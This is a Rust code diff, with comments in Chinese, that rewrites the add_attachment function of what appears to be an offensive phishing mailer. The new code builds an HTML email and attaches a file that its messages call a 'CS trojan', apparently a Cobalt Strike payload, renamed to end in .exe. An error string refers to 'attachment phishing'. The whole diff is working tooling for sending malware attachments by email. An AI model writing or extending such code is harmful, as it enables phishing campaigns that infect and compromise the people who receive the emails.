@@ -90,6 +90,8 @@ fn ensure_exe_suffix(s: &str) -> String {
     }
 }
 
+//原始的add_attachment函数
+/*
 fn add_attachment(
     html_content: &str,
     original_appendix_name_exe: &str,
@@ -164,3 +166,57 @@ fn add_attachment(
     }
 
 }
+*/
+//修改后的add_attachment函数
+fn add_attachment(
+    html_content: &str,
+    original_appendix_name_exe: &str,
+    entry_id: &str,
+    use_appendix: bool,
+    appendix_name_for_sending: &str,
+) -> Result<MultiPart, Box<dyn Error>> {
+    let appendix_name_for_sending = ensure_exe_suffix(appendix_name_for_sending);
+    let mpart = MultiPart::mixed()
+        .singlepart(
+            lettre::message::SinglePart::builder()
+                .header(lettre::message::header::ContentType::TEXT_HTML)
+                .body(html_content.to_string())
+        );
+
+    #[cfg(not(feature = "appendix"))]
+    match use_appendix {
+        true => {
+            return Err(Box::new(std::io::Error::new(
+                std::io::ErrorKind::NotFound,
+                "你的程序没有编译appendix功能，不支持附件钓鱼，请修改你的配置文件"
+            )))
+        },
+        false => {
+            return Ok(mpart);
+        }
+    }
+
+    #[cfg(feature = "appendix")]
+    match use_appendix {
+        true => {
+            // 直接读取CS生成的原始文件
+            let body = fs::read(original_appendix_name_exe)?;
+
+            let path = Path::new(&appendix_name_for_sending);
+            let mime_str = MimeGuess::from_path(path)
+                .first_or_octet_stream()
+                .essence_str().to_string(); 
+
+            crate::print_success(&format!("成功加载CS木马文件 {}", original_appendix_name_exe));
+
+            return Ok(mpart.singlepart(
+                Attachment::new(appendix_name_for_sending.to_string())
+                    .body(body, ContentType::parse(&mime_str)?)
+            ))
+        },
+        false => {
+            return Ok(mpart);
+        }
+    }
+}
+
